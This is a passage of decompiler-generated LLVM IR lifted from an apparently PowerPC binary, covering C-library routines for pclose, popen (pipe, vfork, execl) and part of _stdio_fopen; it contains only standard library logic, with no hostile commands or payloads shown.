  %v4_10019c50 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32))
  store i32 268541020, i32* @lr, align 4
  %v1_10019c58 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32))
  %v3_10019c60 = load i32, i32* @global_var_10045234.1142, align 4
  store i32 %v3_10019c60, i32* %r29.global-to-local, align 4
  %v3_10019c64 = icmp eq i32 %v3_10019c60, 0
  br i1 %v3_10019c64, label %dec_label_pc_10019cc0, label %dec_label_pc_10019c6c

dec_label_pc_10019c6c:                            ; preds = %entry
  %v1_10019c6c = add i32 %v3_10019c60, 4
  %v2_10019c6c = inttoptr i32 %v1_10019c6c to i32*
  %v3_10019c6c = load i32, i32* %v2_10019c6c, align 4
  %v1_10019c70 = load i32, i32* @r31, align 4
  %v4_10019c70 = icmp eq i32 %v3_10019c6c, %v1_10019c70
  br i1 %v4_10019c70, label %dec_label_pc_10019c78, label %dec_label_pc_10019c9c

dec_label_pc_10019c78:                            ; preds = %dec_label_pc_10019c6c
  %v1_10019c78 = inttoptr i32 %v3_10019c60 to i32*
  %v2_10019c78 = load i32, i32* %v1_10019c78, align 4
  store i32 %v2_10019c78, i32* @global_var_10045234.1142, align 4
  br label %dec_label_pc_10019cc0

dec_label_pc_10019c84:                            ; preds = %dec_label_pc_10019c9c
  %v0_10019c84 = call i32 @__errno_location()
  %v2_10019c8c = inttoptr i32 %v0_10019c84 to i32*
  store i32 22, i32* %v2_10019c8c, align 4
  br label %dec_label_pc_10019cc0

dec_label_pc_10019c94:                            ; preds = %dec_label_pc_10019ce8
  %v3_10019c94 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_10019d14

dec_label_pc_10019c9c:                            ; preds = %dec_label_pc_10019c6c, %dec_label_pc_10019cac
  %v1_10019cbc = phi i32 [ %v2_10019ca0, %dec_label_pc_10019cac ], [ %v3_10019c60, %dec_label_pc_10019c6c ]
  %v1_10019ca0 = inttoptr i32 %v1_10019cbc to i32*
  %v2_10019ca0 = load i32, i32* %v1_10019ca0, align 4
  store i32 %v2_10019ca0, i32* %r29.global-to-local, align 4
  %v3_10019ca4 = icmp eq i32 %v2_10019ca0, 0
  br i1 %v3_10019ca4, label %dec_label_pc_10019c84, label %dec_label_pc_10019cac

dec_label_pc_10019cac:                            ; preds = %dec_label_pc_10019c9c
  %v1_10019cac = add i32 %v2_10019ca0, 4
  %v2_10019cac = inttoptr i32 %v1_10019cac to i32*
  %v3_10019cac = load i32, i32* %v2_10019cac, align 4
  %v4_10019cb0 = icmp eq i32 %v3_10019cac, %v1_10019c70
  br i1 %v4_10019cb0, label %dec_label_pc_10019cb8, label %dec_label_pc_10019c9c

dec_label_pc_10019cb8:                            ; preds = %dec_label_pc_10019cac
  %v1_10019cb8 = inttoptr i32 %v2_10019ca0 to i32*
  %v2_10019cb8 = load i32, i32* %v1_10019cb8, align 4
  store i32 %v2_10019cb8, i32* %v1_10019ca0, align 4
  br label %dec_label_pc_10019cc0

dec_label_pc_10019cc0:                            ; preds = %entry, %dec_label_pc_10019c84, %dec_label_pc_10019c78, %dec_label_pc_10019cb8
  store i32 %v2_10019c48, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268541132, i32* @lr, align 4
  %v0_10019cc8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10019ccc = load i32, i32* %r29.global-to-local, align 4
  %v3_10019ccc = icmp eq i32 %v0_10019ccc, 0
  br i1 %v3_10019ccc, label %dec_label_pc_10019d14, label %dec_label_pc_10019cd4

dec_label_pc_10019cd4:                            ; preds = %dec_label_pc_10019cc0
  store i32 %v0_10019ccc, i32* @r3, align 4
  %v1_10019cd8 = add i32 %v0_10019ccc, 8
  %v2_10019cd8 = inttoptr i32 %v1_10019cd8 to i32*
  %v3_10019cd8 = load i32, i32* %v2_10019cd8, align 4
  store i32 %v3_10019cd8, i32* %r29.global-to-local, align 4
  store i32 268541152, i32* @lr, align 4
  %v0_10019cdc = call i32 @free()
  %v0_10019ce0 = load i32, i32* @r31, align 4
  store i32 268541160, i32* @lr, align 4
  %v1_10019ce4 = inttoptr i32 %v0_10019ce0 to i16*
  %v2_10019ce4 = call i32 @__GI_fclose(i16* %v1_10019ce4)
  %v2_10019ce8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10019ce8

dec_label_pc_10019ce8:                            ; preds = %dec_label_pc_10019d00, %dec_label_pc_10019cd4
  %v0_10019cf0 = load i32, i32* @r29, align 4
  store i32 268541176, i32* @lr, align 4
  %v3_10019cf4 = call i32 @waitpid(i32 %v0_10019cf0, i32 %v2_10019ce8, i32 0)
  %tmp8 = icmp sgt i32 %v3_10019cf4, -1
  br i1 %tmp8, label %dec_label_pc_10019c94, label %dec_label_pc_10019d00

dec_label_pc_10019d00:                            ; preds = %dec_label_pc_10019ce8
  %v0_10019d00 = call i32 @__errno_location()
  %v1_10019d04 = inttoptr i32 %v0_10019d00 to i32*
  %v2_10019d04 = load i32, i32* %v1_10019d04, align 4
  %v3_10019d08 = icmp eq i32 %v2_10019d04, 4
  br i1 %v3_10019d08, label %dec_label_pc_10019ce8, label %dec_label_pc_10019d14

dec_label_pc_10019d14:                            ; preds = %dec_label_pc_10019d00, %dec_label_pc_10019cc0, %dec_label_pc_10019c94
  %storemerge = phi i32 [ %v3_10019c94, %dec_label_pc_10019c94 ], [ -1, %dec_label_pc_10019cc0 ], [ -1, %dec_label_pc_10019d00 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10019ccc, { 1, 0, 2 }
  uselistorder i32 %v2_10019ca0, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10019cc0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10019c9c, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_10019d3c = load i8, i8* %arg2, align 1
  %v3_10019d44 = icmp eq i8 %v3_10019d3c, 119
  br i1 %v3_10019d44, label %dec_label_pc_10019d74, label %dec_label_pc_10019d4c

dec_label_pc_10019d4c:                            ; preds = %entry
  %v3_10019d4c = icmp eq i8 %v3_10019d3c, 114
  br i1 %v3_10019d4c, label %dec_label_pc_10019d7c, label %dec_label_pc_10019d5c

dec_label_pc_10019d5c:                            ; preds = %dec_label_pc_10019d4c
  %v0_10019d5c = call i32 @__errno_location()
  %v2_10019d6c = inttoptr i32 %v0_10019d5c to i32*
  store i32 22, i32* %v2_10019d6c, align 4
  br label %dec_label_pc_10019f3c

dec_label_pc_10019d74:                            ; preds = %entry
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10019d7c

dec_label_pc_10019d7c:                            ; preds = %dec_label_pc_10019d4c, %dec_label_pc_10019d74
  %v0_10019e44 = phi i32 [ 0, %dec_label_pc_10019d74 ], [ 1, %dec_label_pc_10019d4c ]
  store i32 12, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10019d84.1145 to i32), i32* @lr, align 4
  %v0_10019d80 = call i32 @malloc()
  store i32 %v0_10019d80, i32* %r9.global-to-local, align 4
  %v3_10019d88 = icmp eq i32 %v0_10019d80, 0
  br i1 %v3_10019d88, label %dec_label_pc_10019f3c, label %dec_label_pc_10019d98

dec_label_pc_10019d98:                            ; preds = %dec_label_pc_10019d7c
  %v2_10019d98 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10019d98, i32* %r29.global-to-local, align 4
  store i32 268541348, i32* @lr, align 4
  %v2_10019da0 = call i32 @__GI_pipe(i32 %v2_10019d98, i32 %v0_10019d80)
  %v3_10019da4 = icmp eq i32 %v2_10019da0, 0
  br i1 %v3_10019da4, label %dec_label_pc_10019dac, label %dec_label_pc_10019f2c

dec_label_pc_10019dac:                            ; preds = %dec_label_pc_10019d98
  store i32 %v0_10019e44, i32* %r9.global-to-local, align 4
  %v0_10019db0 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10019e44
  %v1_10019db4 = and i32 %tmp, 4
  %v1_10019db8 = xor i32 %v1_10019db4, 4
  %v0_10019dbc = load i32, i32* %r29.global-to-local, align 4
  %v2_10019dbc = add i32 %v0_10019dbc, %v1_10019db8
  %v3_10019dbc = inttoptr i32 %v2_10019dbc to i32*
  %v4_10019dbc = load i32, i32* %v3_10019dbc, align 4
  %v2_10019dc8 = add i32 %v0_10019dbc, %v1_10019db4
  %v3_10019dc8 = inttoptr i32 %v2_10019dc8 to i32*
  %v4_10019dc8 = load i32, i32* %v3_10019dc8, align 4
  store i32 268541400, i32* @lr, align 4
  %v4_10019dd4 = call i32 @fdopen(i32 %v4_10019dbc, i32 %v0_10019db0, i32 %v0_10019e44)
  %v3_10019dd8 = icmp eq i32 %v4_10019dd4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10019dd8, label %dec_label_pc_10019de4, label %dec_label_pc_10019df8

dec_label_pc_10019de4:                            ; preds = %dec_label_pc_10019dac
  store i32 268541420, i32* @lr, align 4
  %v1_10019de8 = call i32 @__libc_close(i32 %v4_10019dbc)
  store i32 ptrtoint (i32* @global_var_10019df4.1146 to i32), i32* @lr, align 4
  %v1_10019df0 = call i32 @__libc_close(i32 %v4_10019dc8)
  br label %dec_label_pc_10019f2c

dec_label_pc_10019df8:                            ; preds = %dec_label_pc_10019dac
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32), i32* %r29.global-to-local, align 4
  %v2_10019e0c = ptrtoint i32* %stack_var_-64 to i32
  %v4_10019e10 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268527848, i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32))
  store i32 ptrtoint (i32* @global_var_10019e1c.1148 to i32), i32* @lr, align 4
  %v1_10019e18 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32))
  store i32 %v1_10019e18, i32* @r3, align 4
  store i32 268541472, i32* @lr, align 4
  %v1_10019e1c = call i32 @__vfork(i32 %v1_10019e18)
  %v3_10019e20 = icmp eq i32 %v1_10019e1c, 0
  %v0_10019e24 = call i32 @__asm_mfcr()
  store i32 %v0_10019e24, i32* %r29.global-to-local, align 4
  br i1 %v3_10019e20, label %dec_label_pc_10019e2c, label %dec_label_pc_10019eac

dec_label_pc_10019e2c:                            ; preds = %dec_label_pc_10019df8
  store i32 268541492, i32* @lr, align 4
  %v1_10019e30 = call i32 @__libc_close(i32 %v4_10019dbc)
  store i32 %v0_10019e44, i32* %r9.global-to-local, align 4
  %v4_10019e3c = icmp eq i32 %v4_10019dc8, %v0_10019e44
  br i1 %v4_10019e3c, label %dec_label_pc_10019e58, label %dec_label_pc_10019e44

dec_label_pc_10019e44:                            ; preds = %dec_label_pc_10019e2c
  store i32 268541520, i32* @lr, align 4
  %v2_10019e4c = call i32 @dup2(i32 %v4_10019dc8, i32 %v0_10019e44)
  store i32 268541528, i32* @lr, align 4
  %v1_10019e54 = call i32 @__libc_close(i32 %v4_10019dc8)
  br label %dec_label_pc_10019e58

dec_label_pc_10019e58:                            ; preds = %dec_label_pc_10019e2c, %dec_label_pc_10019e44
  store i32 268697600, i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10045234.1142, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_10019e744 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10019e744, label %dec_label_pc_10019e7c, label %dec_label_pc_10019e64

dec_label_pc_10019e64:                            ; preds = %dec_label_pc_10019e58, %dec_label_pc_10019e64
  %v0_10019e64 = phi i32 [ %storemerge, %dec_label_pc_10019e64 ], [ %storemerge1, %dec_label_pc_10019e58 ]
  %v1_10019e64 = add i32 %v0_10019e64, 4
  %v2_10019e64 = inttoptr i32 %v1_10019e64 to i32*
  %v3_10019e64 = load i32, i32* %v2_10019e64, align 4
  store i32 %v3_10019e64, i32* %r9.global-to-local, align 4
  %v1_10019e68 = add i32 %v3_10019e64, 4
  %v2_10019e68 = inttoptr i32 %v1_10019e68 to i32*
  %v3_10019e68 = load i32, i32* %v2_10019e68, align 4
  store i32 268541552, i32* @lr, align 4
  %v1_10019e6c = call i32 @__libc_close(i32 %v3_10019e68)
  %v0_10019e70 = load i32, i32* %r29.global-to-local, align 4
  %v1_10019e70 = inttoptr i32 %v0_10019e70 to i32*
  %storemerge = load i32, i32* %v1_10019e70, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10019e74 = icmp eq i32 %storemerge, 0
  br i1 %v3_10019e74, label %dec_label_pc_10019e7c, label %dec_label_pc_10019e64

dec_label_pc_10019e7c:                            ; preds = %dec_label_pc_10019e64, %dec_label_pc_10019e58
  %v8_10019ea0 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1002e3dc.1149 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3e4.1150 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3e8.1151 to i32), i32 %arg1, i32 0)
  %v1_10019ea8 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_10019eac

dec_label_pc_10019eac:                            ; preds = %dec_label_pc_10019df8, %dec_label_pc_10019e7c
  store i32 1, i32* @r4, align 4
  store i32 %v2_10019e0c, i32* @r3, align 4
  store i32 268541628, i32* @lr, align 4
  %v0_10019eb8 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268541636, i32* @lr, align 4
  %v1_10019ec0 = call i32 @__libc_close(i32 %v4_10019dc8)
  %v0_10019ec4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10019ec4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_10019ec4)
  %v2_10019ec4 = extractvalue %0 %v1_10019ec4, 0
  %v4_10019ec4 = extractvalue %0 %v1_10019ec4, 2
  %v2_10019ec8 = or i1 %v4_10019ec4, %v2_10019ec4
  br i1 %v2_10019ec8, label %dec_label_pc_10019f24, label %dec_label_pc_10019ecc

dec_label_pc_10019ecc:                            ; preds = %dec_label_pc_10019eac
  store i32 %v0_10019d80, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32), i32* %r29.global-to-local, align 4
  %v0_10019edc = load i32, i32* @r30, align 4
  %v2_10019edc = add i32 %v0_10019d80, 8
  %v3_10019edc = inttoptr i32 %v2_10019edc to i32*
  store i32 %v0_10019edc, i32* %v3_10019edc, align 4
  %v0_10019ee0 = load i32, i32* %r29.global-to-local, align 4
  %v1_10019ee8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10019ee8 = add i32 %v1_10019ee8, 4
  %v3_10019ee8 = inttoptr i32 %v2_10019ee8 to i32*
  store i32 %v4_10019dd4, i32* %v3_10019ee8, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v4_10019ef4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268527848, i32 %v0_10019ee0)
  %v0_10019ef8 = load i32, i32* %r29.global-to-local, align 4
  store i32 268541696, i32* @lr, align 4
  %v1_10019efc = call i32 @pthread_mutex_lock(i32 %v0_10019ef8)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10019f04 = load i32, i32* @global_var_10045234.1142, align 4
  store i32 %v2_10019e0c, i32* @r3, align 4
  store i32 %v0_10019d80, i32* @r11, align 4
  store i32 1, i32* @r4, align 4
  %v2_10019f14 = inttoptr i32 %v0_10019d80 to i32*
  store i32 %v3_10019f04, i32* %v2_10019f14, align 4
  %v0_10019f18 = load i32, i32* @r11, align 4
  store i32 %v0_10019f18, i32* @global_var_10045234.1142, align 4
  store i32 ptrtoint (i32* @global_var_10019f20.1153 to i32), i32* @lr, align 4
  %v0_10019f1c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10019f3c

dec_label_pc_10019f24:                            ; preds = %dec_label_pc_10019eac
  store i32 268541740, i32* @lr, align 4
  %v1_10019f28 = inttoptr i32 %v4_10019dd4 to i16*
  %v2_10019f28 = call i32 @__GI_fclose(i16* %v1_10019f28)
  br label %dec_label_pc_10019f2c

dec_label_pc_10019f2c:                            ; preds = %dec_label_pc_10019d98, %dec_label_pc_10019de4, %dec_label_pc_10019f24
  store i32 %v0_10019d80, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10019f34.1154 to i32), i32* @lr, align 4
  %v0_10019f30 = call i32 @free()
  br label %dec_label_pc_10019f3c

dec_label_pc_10019f3c:                            ; preds = %dec_label_pc_10019d7c, %dec_label_pc_10019ecc, %dec_label_pc_10019d5c, %dec_label_pc_10019f2c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10019d7c ], [ 0, %dec_label_pc_10019f2c ], [ %v4_10019dd4, %dec_label_pc_10019ecc ], [ 0, %dec_label_pc_10019d5c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_10019dd4, { 2, 0, 1, 3 }
  uselistorder i32 %v4_10019dc8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10019d80, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_10019e44, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 4, 3, 9, 10, 5, 6, 7, 8 }
  uselistorder i32* @global_var_10045234.1142, { 1, 2, 0, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1004b82c.1141 to i32), { 4, 0, 3, 5, 1, 2, 6 }
  uselistorder i32 (i32, i32)* @__GI_pipe, { 1, 0 }
  uselistorder label %dec_label_pc_10019f3c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10019f2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10019eac, { 1, 0 }
  uselistorder label %dec_label_pc_10019e64, { 1, 0 }
  uselistorder label %dec_label_pc_10019e58, { 1, 0 }
  uselistorder label %dec_label_pc_10019d7c, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10019f54 = load i32, i32* @lr, align 4
  store i32 %v0_10019f54, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10019f68 = load i32, i32* @r5, align 4
  store i32 %v0_10019f68, i32* @r31, align 4
  %v0_10019f6c = load i32, i32* @r6, align 4
  store i32 %v0_10019f6c, i32* @r29, align 4
  %v3_10019f70 = load i8, i8* %arg2, align 1
  %v4_10019f70 = zext i8 %v3_10019f70 to i32
  store i32 %v4_10019f70, i32* %r0.global-to-local, align 4
  %v3_10019f74 = icmp eq i8 %v3_10019f70, 114
  br i1 %v3_10019f74, label %dec_label_pc_10019fc0, label %dec_label_pc_10019f7c

dec_label_pc_10019f7c:                            ; preds = %entry
  %v3_10019f7c = icmp eq i8 %v3_10019f70, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10019f7c, label %dec_label_pc_10019fc4, label %dec_label_pc_10019f88

dec_label_pc_10019f88:                            ; preds = %dec_label_pc_10019f7c
  %v3_10019f88 = icmp eq i8 %v3_10019f70, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10019f88, label %dec_label_pc_10019fc4, label %dec_label_pc_10019f94

dec_label_pc_10019f94:                            ; preds = %dec_label_pc_1001a054, %dec_label_pc_1001a024, %dec_label_pc_10019f88
  %v0_10019f94 = call i32 @__errno_location()
  %v0_10019f98 = load i32, i32* @r31, align 4
  %v3_10019f98 = icmp eq i32 %v0_10019f98, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10019fa0 = inttoptr i32 %v0_10019f94 to i32*
  store i32 22, i32* %v2_10019fa0, align 4
  br i1 %v3_10019f98, label %dec_label_pc_1001a1f4, label %dec_label_pc_10019fa8

dec_label_pc_10019fa8:                            ; preds = %dec_label_pc_1001a088, %dec_label_pc_10019f94
  %v0_10019fa8 = load i32, i32* @r31, align 4
  %v1_10019fa8 = inttoptr i32 %v0_10019fa8 to i16*
  %v2_10019fa8 = load i16, i16* %v1_10019fa8, align 2
  %v3_10019fa8 = zext i16 %v2_10019fa8 to i32
  store i32 %v3_10019fa8, i32* %r0.global-to-local, align 4
  %v1_10019fac = and i32 %v3_10019fa8, 8192
  store i32 %v1_10019fac, i32* %r9.global-to-local, align 4
  %v3_10019fac = icmp eq i32 %v1_10019fac, 0
  store i1 %v3_10019fac, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10019fac, label %dec_label_pc_1001a1f4, label %dec_label_pc_10019fb4

dec_label_pc_10019fb4:                            ; preds = %dec_label_pc_10019fa8
  store i32 %v0_10019fa8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10019fbc.1155 to i32), i32* @lr, align 4
  %v0_10019fb8 = call i32 @free()
  br label %dec_label_pc_1001a1f4

dec_label_pc_10019fc0:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10019fc4

dec_label_pc_10019fc4:                            ; preds = %dec_label_pc_10019f88, %dec_label_pc_10019f7c, %dec_label_pc_10019fc0
  %v0_10019fe4 = phi i32 [ 1089, %dec_label_pc_10019f88 ], [ 577, %dec_label_pc_10019f7c ], [ 1, %dec_label_pc_10019fc0 ]
  %v2_10019fc4 = add i32 %tmp, 1
  %v3_10019fc4 = inttoptr i32 %v2_10019fc4 to i8*
  %v4_10019fc4 = load i8, i8* %v3_10019fc4, align 1
  %v5_10019fc4 = zext i8 %v4_10019fc4 to i32
  store i32 %v5_10019fc4, i32* %r0.global-to-local, align 4
  %v3_10019fcc = icmp eq i8 %v4_10019fc4, 98
  br i1 %v3_10019fcc, label %dec_label_pc_10019fd8, label %dec_label_pc_10019fd4

dec_label_pc_10019fd4:                            ; preds = %dec_label_pc_10019fc4
  br label %dec_label_pc_10019fd8

dec_label_pc_10019fd8:                            ; preds = %dec_label_pc_10019fc4, %dec_label_pc_10019fd4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10019fd4 ], [ %v2_10019fc4, %dec_label_pc_10019fc4 ]
  %v0_10019fd8 = phi i32 [ %tmp, %dec_label_pc_10019fd4 ], [ %v2_10019fc4, %dec_label_pc_10019fc4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10019fd8 = add i32 %v0_10019fd8, 1
  %v2_10019fd8 = inttoptr i32 %v1_10019fd8 to i8*
  %v3_10019fd8 = load i8, i8* %v2_10019fd8, align 1
  %v4_10019fd8 = zext i8 %v3_10019fd8 to i32
  store i32 %v4_10019fd8, i32* %r0.global-to-local, align 4
  %v3_10019fdc = icmp eq i8 %v3_10019fd8, 43
  br i1 %v3_10019fdc, label %dec_label_pc_10019fe4, label %dec_label_pc_10019fec

dec_label_pc_10019fe4:                            ; preds = %dec_label_pc_10019fd8
  store i32 %v0_10019fe4, i32* %r9.global-to-local, align 4
  %v1_10019fe8 = add nuw nsw i32 %v0_10019fe4, 1
  store i32 %v1_10019fe8, i32* @r28, align 4
  br label %dec_label_pc_10019fec

dec_label_pc_10019fec:                            ; preds = %dec_label_pc_10019fd8, %dec_label_pc_10019fe4
  %v3_10019fec = icmp eq i32 %v0_10019f68, 0
  br i1 %v3_10019fec, label %dec_label_pc_10019ff4, label %dec_label_pc_1001a01c

dec_label_pc_10019ff4:                            ; preds = %dec_label_pc_10019fec
  store i32 80, i32* @r3, align 4
  store i32 268541948, i32* @lr, align 4
  %v0_10019ff8 = call i32 @malloc()
  store i32 %v0_10019ff8, i32* @r31, align 4
  %v4_10019ffc = icmp eq i32 %v0_10019ff8, 0
  store i1 %v4_10019ffc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_10019ffc, label %dec_label_pc_1001a1f8, label %dec_label_pc_1001a004

dec_label_pc_1001a004:                            ; preds = %dec_label_pc_10019ff4
  %v1_1001a008 = add i32 %v0_10019ff8, 56
  store i32 %v1_1001a008, i32* @r3, align 4
  %v3_1001a00c = inttoptr i32 %v0_10019ff8 to i16*
  store i16 8192, i16* %v3_1001a00c, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001a014 = load i32, i32* @r31, align 4
  %v2_1001a014 = add i32 %v1_1001a014, 8
  %v3_1001a014 = inttoptr i32 %v2_1001a014 to i32*
  store i32 0, i32* %v3_1001a014, align 4
  store i32 268541980, i32* @lr, align 4
  %v0_1001a018 = call i32 @__stdio_init_mutex()
  %v0_1001a01c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001a01c

dec_label_pc_1001a01c:                            ; preds = %dec_label_pc_10019fec, %dec_label_pc_1001a004
  %v0_1001a07c = phi i32 [ %v0_10019f6c, %dec_label_pc_10019fec ], [ %v0_1001a01c.pre, %dec_label_pc_1001a004 ]
  %v1_1001a01c = icmp slt i32 %v0_1001a07c, 0
  br i1 %v1_1001a01c, label %dec_label_pc_1001a07c, label %dec_label_pc_1001a024

dec_label_pc_1001a024:                            ; preds = %dec_label_pc_1001a01c
  %v1_1001a028 = add i32 %arg1, 1
  store i32 %v1_1001a028, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1001a030 = load i32, i32* @r31, align 4
  %v2_1001a030 = add i32 %v1_1001a030, 4
  %v3_1001a030 = inttoptr i32 %v2_1001a030 to i32*
  store i32 %v0_1001a07c, i32* %v3_1001a030, align 4
  %v0_1001a034 = load i32, i32* @r28, align 4
  %v1_1001a034 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001a034 = and i32 %v1_1001a034, %v0_1001a034
  %v1_1001a038 = add i32 %v2_1001a034, 1
  store i32 %v1_1001a038, i32* %r9.global-to-local, align 4
  %v1_1001a03c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001a03c = and i32 %v1_1001a03c, %v1_1001a038
  store i32 %v2_1001a03c, i32* %r0.global-to-local, align 4
  %v4_1001a040 = icmp eq i32 %v2_1001a03c, %v1_1001a038
  br i1 %v4_1001a040, label %dec_label_pc_1001a048, label %dec_label_pc_10019f94

dec_label_pc_1001a048:                            ; preds = %dec_label_pc_1001a024
  %v2_1001a048 = sub i32 -1, %arg1
  %v3_1001a048 = and i32 %v0_1001a034, %v2_1001a048
  store i32 %v3_1001a048, i32* %r0.global-to-local, align 4
  %v1_1001a04c = and i32 %v3_1001a048, 1024
  store i32 %v1_1001a04c, i32* %r9.global-to-local, align 4
  %v3_1001a04c = icmp eq i32 %v1_1001a04c, 0
  store i1 %v3_1001a04c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1001a04c, label %dec_label_pc_1001a070, label %dec_label_pc_1001a054

dec_label_pc_1001a054:                            ; preds = %dec_label_pc_1001a048
  %v0_1001a054 = load i32, i32* @r29, align 4
  store i32 268542056, i32* @lr, align 4
  %v2_1001a064 = call i32 @__libc_fcntl(i32 %v0_1001a054, i32 4)
  %v3_1001a068 = icmp eq i32 %v2_1001a064, 0
  br i1 %v3_1001a068, label %dec_label_pc_1001a070, label %dec_label_pc_10019f94

dec_label_pc_1001a070:                            ; preds = %dec_label_pc_1001a054, %dec_label_pc_1001a048
  %v1_1001a070 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1001a070, i32* %r0.global-to-local, align 4
  %v0_1001a074 = load i32, i32* @r28, align 4
  %v2_1001a074 = or i32 %v0_1001a074, %v1_1001a070
  store i32 %v2_1001a074, i32* @r28, align 4
  br label %dec_label_pc_1001a0a8

dec_label_pc_1001a07c:                            ; preds = %dec_label_pc_1001a01c
  %v3_1001a07c = icmp eq i32 %v0_1001a07c, -1
  %v0_1001a08c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1001a07c, label %dec_label_pc_1001a088, label %dec_label_pc_1001a084

dec_label_pc_1001a084:                            ; preds = %dec_label_pc_1001a07c
  %v1_1001a084 = or i32 %v0_1001a08c.pre, 65536
  store i32 %v1_1001a084, i32* @r28, align 4
  br label %dec_label_pc_1001a088

dec_label_pc_1001a088:                            ; preds = %dec_label_pc_1001a07c, %dec_label_pc_1001a084
  %v0_1001a08c = phi i32 [ %v1_1001a084, %dec_label_pc_1001a084 ], [ %v0_1001a08c.pre, %dec_label_pc_1001a07c ]
  store i32 %v0_1001a08c, i32* @r4, align 4
  store i32 438, i32* @r5, align 4
  store i32 268542108, i32* @lr, align 4
  %v0_1001a098 = call i32 @__libc_open()
  %v1_1001a09c = icmp slt i32 %v0_1001a098, 0
  %v1_1001a0a0 = load i32, i32* @r31, align 4
  %v2_1001a0a0 = add i32 %v1_1001a0a0, 4
  %v3_1001a0a0 = inttoptr i32 %v2_1001a0a0 to i32*
  store i32 %v0_1001a098, i32* %v3_1001a0a0, align 4
  br i1 %v1_1001a09c, label %dec_label_pc_10019fa8, label %dec_label_pc_1001a088.dec_label_pc_1001a0a8_crit_edge

